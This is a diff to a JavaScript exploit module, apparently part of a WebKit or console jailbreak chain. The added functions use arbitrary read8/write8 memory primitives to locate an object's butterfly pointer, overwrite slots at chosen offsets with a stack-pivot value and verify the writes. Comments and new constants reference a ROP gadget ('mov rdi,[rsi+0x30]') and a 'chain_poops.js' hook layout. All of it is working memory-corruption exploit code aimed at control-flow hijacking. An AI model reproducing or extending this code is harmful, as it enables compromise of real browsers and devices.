@@ -434,6 +434,53 @@ export function bisectHookPivotMulti(p, prep, hookOffs) {
     return saved;
 }
 
+/** Hook store S on butterfly slots (13.52 may use rsi=butterfly not pivotCell). */
+export function bisectHookPivotButterfly(p, prep, hookOffs) {
+    if (!prep || !prep.pivotCell || !prep.M)
+        throw new Error("bisectHookPivotButterfly: no prep");
+    hookOffs = hookOffs || G0_HOOK_OFFS;
+    let bf = null;
+    try { bf = p.read8(prep.pivotCell.add32(0x8)); } catch (_) { bf = null; }
+    if (!bf || bf.hi === 0)
+        throw new Error("bisectHookPivotButterfly: no butterfly @ pivotCell+0x8");
+    if (!prep._bisect) prep._bisect = {};
+    const saved = [];
+    for (let i = 0; i < hookOffs.length; i++) {
+        const site = bf.add32(hookOffs[i]);
+        saved.push({ site, off: hookOffs[i], base: "bf", val: p.read8(site) });
+        p.write8(site, prep.M.S);
+    }
+    prep._bisect.multiSaved = saved;
+    prep._bisect.pivotSite = saved.length ? saved[0].site : bf;
+    prep._bisect.butterfly = bf;
+    return saved;
+}
+
+/** Verify hooks written to multiSaved sites (cell or butterfly). */
+export function verifyPivotHookSaved(p, prep) {
+    const rows = [];
+    if (!prep || !prep.M || !prep._bisect || !prep._bisect.multiSaved)
+        return { ok: false, okCount: 0, rows, want: prep.M && prep.M.S };
+    const want = prep.M.S;
+    const saved = prep._bisect.multiSaved;
+    let okCount = 0;
+    for (let i = 0; i < saved.length; i++) {
+        const e = saved[i];
+        let peek = null;
+        try { peek = p.read8(e.site); } catch (_) { peek = null; }
+        const match = peek != null && String(peek) === String(want);
+        if (match) okCount++;
+        rows.push({
+            off: e.off,
+            base: e.base || "cell",
+            peek,
+            want,
+            ok: match,
+        });
+    }
+    return { ok: okCount > 0, okCount, rows, want };
+}
+
 /** Read back hook slots — confirms write8 stuck before expm1 (survives fast OOM). */
 export function verifyPivotHookWrites(p, prep, hookOffs) {
     const rows = [];
@@ -504,7 +551,10 @@ export function bisectHookPivotPoops(p, prep) {
     p.write8(prep.pivotCell, prep.M.S);
 }
 
-/** Offsets poisoned for G0 `mov rdi,[rsi+0x30]` — cover rsi=pivotCell and rsi=pivotCell-0x30. */
+/** poops chain_poops.js — hook leakval+0 only (rsi=pivotCell-0x30 → [rsi+0x30]=cell+0). */
+export const G0_HOOK_POOPS = [0x0];
+
+/** Offsets poisoned on pivotCell for G0 rsi layout hunt (can corrupt object — use N5multi only). */
 export const G0_HOOK_OFFS = [0x0, 0x20, 0x28, 0x30, 0x38];
 
 /** Slab + arm checks before fire — throws instead of OOM when bufAddr is wrong. */
